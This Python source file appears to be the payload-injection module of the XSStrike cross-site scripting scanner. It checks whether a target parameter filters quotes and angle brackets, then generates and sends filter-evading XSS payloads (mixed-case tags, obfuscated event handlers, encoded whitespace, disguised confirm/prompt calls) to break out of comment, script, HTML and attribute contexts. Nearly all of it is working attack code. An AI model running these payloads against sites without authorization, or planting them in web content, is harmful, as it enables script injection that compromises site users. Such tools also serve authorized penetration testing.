import sys
import random
try:
    from urllib.parse import quote_plus
except:
    print ('\033[91m[-]\033[0m XSStrike isn\'t compatible with python2. Run it with python3 i.e. \033[7;92mpython3 xsstrike\033[0m')
    quit()
from core.which_quote import which_quote
from core.test_param_check import test_param_check

tags = ['sVg', 'iMg', 'bOdY', 'd3v', 'deTails'] # HTML Tags

event_handlers = { # Event handlers and the name of tags which can be used with them
'oNToggLe': ['deTails'],
'oNMoUseOver': ['d3v', 'a', 'bOdY'],
'oNeRror': ['OBjEct', 'iMg', 'viDeo'],
'oNloAd': ['sVg', 'bOdY'],
'oNsTart': ['maRQuee'],
'oNfoCus': ['d3v', 'bOdY'],
'oNCliCk': ['d3v', 'bOdY']
}

functions = [ # JavaScript functions to get a popup
'[8].find(confirm)', 'confirm()',
'(confirm)()', 'co\u006efir\u006d()',
'(prompt)``', 'a=prompt,a()']

#Colors and shit like that
white = '\033[97m'
green = '\033[92m'
red = '\033[91m'
yellow = '\033[93m'
end = '\033[0m'
back = '\033[7;91m'
info = '\033[93m[!]\033[0m'
que = '\033[94m[?]\033[0m'
bad = '\033[91m[-]\033[0m'
good = '\033[32m[+]\033[0m'
run = '\033[97m[~]\033[0m'

def inject(url, param_data, method, occur_number, occur_location, cookie):
    special = ''
    l_filling = ''
    e_fillings = ['%0a','%09','%0d','+'] # "Things" to use between event handler and = or between function and =
    fillings = ['%0a','%09','%0d','/+/'] # "Things" to use instead of space
    
    for OCCURENCE_NUM, location in zip(occur_number, occur_location):
        print('\n%s Testing reflection no. %s ' % (run, OCCURENCE_NUM))
        allowed = []
        
        if test_param_check('d3v"d3v', 'd3v"d3v', OCCURENCE_NUM, url, param_data, method, 'nope', cookie):
            print('%s Double Quotes (") are allowed.' % good)
            double_allowed = True
            allowed.append('"')
        elif test_param_check('d3v"d3v', 'd3v&quot;d3v', OCCURENCE_NUM, url, param_data, method, 'nope', cookie):
            print('%s Double Quotes (") are not allowed.' % bad)
            print('%s HTML Encoding detected i.e " --> &quot;' % bad)
            HTML_encoding = True
        else:
            print('%s Double Quotes (") are not allowed.' % bad)
            double_allowed = False
        
        if test_param_check('d3v\'d3v', 'd3v\'d3v', OCCURENCE_NUM, url, param_data, method, 'nope', cookie):
            print('%s Single Quotes (\') are allowed.' % good)
            single_allowed = True
            allowed.append('\'')
        else:
            single_allowed = False
            print('%s Single Quotes (\') are not allowed.' % bad)
        
        if test_param_check('<lol', '<lol', OCCURENCE_NUM, url, param_data, method, 'nope', cookie):
            print('%s Angular Brackets (<>) are allowed.' % good)
            angular_allowed = True
            allowed.extend(('<', '>'))
        else:
            angular_allowed = False
            print('%s Angular Brackets (<>) are not allowed.' % bad)

        if len(allowed) == 0:
            print ('%s This parameter is properly sanitized.' % bad)
        else:
            if location == 'comment':
                print('%s Trying to break out of %sHTML Comment%s context.' % (run, green, end))
                prefix = '-->'
                suffixes = ['', '<!--']
                progress = 1
                for suffix in suffixes:
                    for tag in tags:
                        for event_handler, compatible in list(event_handlers.items()):
                            if tag in compatible:
                                for filling, function, e_filling in zip(fillings, functions, e_fillings):
                                    progress = progress + 1
                                    sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
                                    sys.stdout.flush()
                                    if event_handler == 'oNeRror':
                                        payload = '%s<%s%s%s%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, suffix)
                                    else:
                                        payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
                                    test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, method, 'do', cookie)
                print('')
            elif location == 'script':
                print('%s Trying to break out of %sJavaScript%s context.' % (run, green, end))
                quote = which_quote(OCCURENCE_NUM, url, param_data, method, cookie)
                if quote == None or quote == '':
                    quote = ''
                prefixes = ['%s-' % quote, '\\%s-' % quote, '\\%s-' % quote]
                suffixes = ['-%s' % quote, '-\\%s' % quote, '//%s' % quote]
                progress = 0
                for prefix, suffix in zip(prefixes, suffixes):
                    for function in functions:
                        progress = progress + 1
                        sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
                        sys.stdout.flush()
                        payload = prefix + function + suffix
                        test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, method, 'do', cookie)
                test_param_check(quote_plus('</script><svg onload=prompt()>'), '</script><svg onload=prompt()>', OCCURENCE_NUM, url, param_data, method, 'do', cookie)
            
            elif location == 'html':
                print('%s Trying to break out of %sPlaintext%s context.' % (run, green, end))
                progress = 0
                if not angular_allowed:
                    print('%s Angular brackets are being filtered. Unable to generate payloads.' % bad)
                    continue
                for tag in tags:
                    for event_handler, compatible in list(event_handlers.items()):
                        if tag in compatible:
                            for filling, function, e_filling in zip(fillings, functions, e_fillings):
                                progress = progress + 1
                                sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
                                sys.stdout.flush()
                                g_than = random.choice(['>', '//'])
                                if event_handler == 'oNeRror':
                                    payload = '<%s%s%s%s%s%s%s%s=%s%s%s%s' % (tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, g_than)
                                elif tag == 'd3v':
                                    payload = '<%s%s%s%s%s=%s%s%s%sthis' % (tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, g_than)
                                else:
                                    payload = '<%s%s%s%s%s=%s%s%s%s' % (tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, g_than)
                                test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, method, 'do', cookie)

            elif location == 'attribute':
                print('%s Trying to break out of %sAttribute%s context.' % (run, green, end))
                quote = which_quote(OCCURENCE_NUM, url, param_data, method, cookie)
                
                if quote == '':
                    prefix = '/>'
                    suffixes = ['<"', '<\'', '<br attr\'=', '<br attr="']
                
                elif quote in allowed:
                    prefix = '%s>' % quote
                    suffixes = ['<%s' % quote, '<br attr=%s' % quote]
                    progress = 0
                    for e_filling, function in zip(e_fillings, functions):
                        payload = '%saUTofOCus/oNfoCus%s=%s%s%s' % (quote, e_filling, e_filling, quote, function)
                        test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, method, 'do', cookie)
                        progress = progress + 1
                        sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
                        sys.stdout.flush()
                    sys.stdout.flush()
                    progress = progress + 1
                    for suffix in suffixes:
                        for tag in tags:
                            for event_handler, compatible in list(event_handlers.items()):
                                if tag in compatible:
                                    for filling, function, e_filling in zip(fillings, functions, e_fillings):
                                        progress = progress + 1
                                        sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
                                        sys.stdout.flush()
                                        if event_handler == 'oNeRror':
                                            payload = '%s<%s%s%s%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, suffix)
                                        else:
                                            payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
                                        test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, method, 'do', cookie)
                    print('')
                else:
                    print('%s Quotes are being filtered, its not possible to break out of the context.' % bad)
